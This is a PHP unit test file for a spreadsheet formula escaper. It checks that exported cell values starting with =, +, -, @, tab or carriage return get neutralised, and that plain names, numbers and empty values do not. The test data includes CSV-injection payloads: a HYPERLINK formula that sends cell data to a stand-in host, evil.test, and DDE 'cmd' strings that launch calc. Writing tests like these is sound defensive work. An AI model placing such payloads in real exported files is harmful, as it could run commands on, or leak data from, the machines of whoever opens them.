<?php

namespace Tests\Unit\Services\Infrastructure\Export;

use HiEvents\Services\Infrastructure\Export\SpreadsheetFormulaEscaper;
use Tests\TestCase;

class SpreadsheetFormulaEscaperTest extends TestCase
{
    private SpreadsheetFormulaEscaper $escaper;

    protected function setUp(): void
    {
        parent::setUp();

        $this->escaper = new SpreadsheetFormulaEscaper;
    }

    /**
     * @dataProvider formulaProvider
     */
    public function test_it_neutralises_formula_triggers(string $value): void
    {
        $this->assertTrue($this->escaper->isFormulaTrigger($value));
        $this->assertSame("'".$value, $this->escaper->escape($value));
    }

    public static function formulaProvider(): array
    {
        return [
            'equals' => ['=1+1'],
            'hyperlink' => ['=HYPERLINK("http://evil.test?d="&A1,"Click")'],
            'cmd injection' => ['=cmd|\' /C calc\'!A0'],
            'plus' => ['+1+1'],
            'at' => ['@SUM(A1:A9)'],
            'tab' => ["\t=1+1"],
            'carriage return' => ["\r=1+1"],
            'minus formula' => ['-1+1+cmd|\' /C calc\'!A0'],
        ];
    }

    /**
     * @dataProvider safeValueProvider
     */
    public function test_it_leaves_safe_values_untouched(mixed $value): void
    {
        $this->assertFalse($this->escaper->isFormulaTrigger($value));
        $this->assertSame($value, $this->escaper->escape($value));
    }

    public static function safeValueProvider(): array
    {
        return [
            'plain name' => ['Ada Lovelace'],
            'email' => ['ada@example.com'],
            'empty string' => [''],
            'negative number string' => ['-50.00'],
            'positive number string' => ['+50.00'],
            'integer' => [42],
            'float' => [42.5],
            'null' => [null],
            'boolean' => [true],
        ];
    }

    public function test_it_escapes_every_column_in_a_row(): void
    {
        $row = ['Ada Lovelace', '=1+1', '-50.00', '@SUM(A1:A9)'];

        $this->assertSame(
            ['Ada Lovelace', "'=1+1", '-50.00', "'@SUM(A1:A9)"],
            $this->escaper->escapeRow($row),
        );
    }
}
